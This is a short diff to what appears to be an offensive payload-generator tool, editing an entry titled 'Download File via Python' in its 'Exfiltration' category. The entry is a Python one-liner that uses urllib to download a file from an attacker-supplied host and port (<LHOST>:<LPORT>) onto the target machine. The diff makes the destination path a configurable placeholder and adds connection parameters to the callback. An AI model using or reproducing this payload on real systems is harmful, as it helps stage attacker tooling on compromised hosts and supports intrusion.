@@ -88,9 +88,9 @@ Load({
 
 Load({
 	title: "Download File via Python",
-	payload:'python -c \'import urllib;urllib.urlretrieve ("http://<LHOST>:<LPORT>/<PROMPT>","/tmp/<PROMPT>");\'',
+	payload:'python -c \'import urllib;urllib.urlretrieve ("http://<LHOST>:<LPORT>/<PROMPT>","<PATH>");\'',
 	category: "Exfiltration",
-	callback: function(returnToPrepare){
+	callback: function(returnToPrepare, lhost, lport, rhost, rport, user, path){
 		question.ask("What file would you like to download? (ex: script.sh)", returnToPrepare)
 	}
 })
